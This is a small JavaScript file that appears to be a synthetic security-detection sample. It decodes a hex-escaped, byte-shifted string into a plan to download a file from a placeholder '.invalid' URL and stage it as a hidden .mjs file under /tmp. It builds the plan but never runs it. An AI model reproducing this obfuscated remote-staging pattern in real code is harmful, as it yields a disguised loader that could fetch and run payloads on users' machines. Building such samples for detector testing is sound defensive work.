const moduleShape = Object.freeze({ format: "commonjs" });
const Material_b62c1078 = "\\x7b\\x42\\x36\\x81\\x78\\x79\\x6a\\x75\\x78\\x42\\x66\\x68\\x76\\x7a\\x6e\\x77\\x6a\\x64\\x77\\x6a\\x72\\x74\\x79\\x6a\\x31\\x7c\\x77\\x6e\\x79\\x6a\\x64\\x6b\\x6e\\x71\\x6a\\x81\\x66\\x69\\x66\\x75\\x79\\x6a\\x77\\x42\\x6d\\x79\\x79\\x75\\x78\\x64\\x79\\x74\\x64\\x75\\x6e\\x75\\x6a\\x71\\x6e\\x73\\x6a\\x81\\x78\\x79\\x66\\x6c\\x6a\\x64\\x68\\x74\\x7a\\x73\\x79\\x42\\x36\\x81\\x68\\x66\\x72\\x75\\x66\\x6e\\x6c\\x73\\x64\\x6e\\x69\\x42\\x53\\x54\\x49\\x4a\\x32\\x46\\x39\\x35\\x3e\\x36\\x3c\\x3a\\x48\\x81\\x7a\\x77\\x71\\x42\\x6d\\x79\\x79\\x75\\x78\\x3f\\x34\\x34\\x73\\x74\\x69\\x6a\\x32\\x66\\x39\\x35\\x3e\\x36\\x3c\\x3a\\x68\\x6b\\x66\\x3c\\x3c\\x33\\x6a\\x7d\\x66\\x72\\x75\\x71\\x6a\\x33\\x6e\\x73\\x7b\\x66\\x71\\x6e\\x69\\x34\\x66\\x75\\x6e\\x81\\x7a\\x78\\x6a\\x77\\x64\\x66\\x6c\\x6a\\x73\\x79\\x42\\x53\\x74\\x69\\x6a\\x46\\x7a\\x69\\x6e\\x79\\x34\\x66\\x39\\x35\\x3e\\x81\\x6b\\x6e\\x71\\x6a\\x64\\x75\\x66\\x79\\x6d\\x42\\x34\\x79\\x72\\x75\\x34\\x6d\\x7a\\x73\\x79\\x77\\x6a\\x78\\x78\\x32\\x73\\x74\\x69\\x6a\\x34\\x33\\x78\\x79\\x66\\x6c\\x6a\\x32\\x66\\x39\\x35\\x3e\\x36\\x3c\\x3a\\x68\\x6b\\x66\\x3c\\x3c\\x33\\x72\\x6f\\x78";
const Codec_b62c1078 = "escaped_octets|add_modulo_256|05";

function load_b62c1078() { return [...Material_b62c1078.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_b62c1078(EnCoDeD) { return EnCoDeD.map((value) => (value - 5 + 256) & 255); }
async function recover_b62c1078() {
  const NeUtRaL = 19 * 7 - 133;
  const EnCoDeD = load_b62c1078(); let DeCoDeD = [];
  let PaSs = 0; while (PaSs++ < 1) DeCoDeD = decode_b62c1078(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_b62c1078() { return await recover_b62c1078(); }
async function plan_b62c1078() { const inspect = inspect_b62c1078; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_b62c1078;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_b62c1078());
